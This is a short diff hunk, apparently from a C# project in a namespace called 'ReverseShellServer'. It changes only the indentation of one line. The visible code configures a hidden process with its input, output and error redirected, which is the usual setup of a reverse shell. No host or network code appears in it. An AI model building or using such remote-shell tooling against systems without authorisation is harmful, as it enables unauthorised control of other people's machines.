@@ -70,7 +70,7 @@ namespace ReverseShellServer
                         CreateNoWindow = true,
                         UseShellExecute = false,
                         StandardOutputEncoding = Encoding.GetEncoding(850),
-                RedirectStandardOutput = true,
+                        RedirectStandardOutput = true,
                         RedirectStandardInput = true,
                         RedirectStandardError = true
                     }
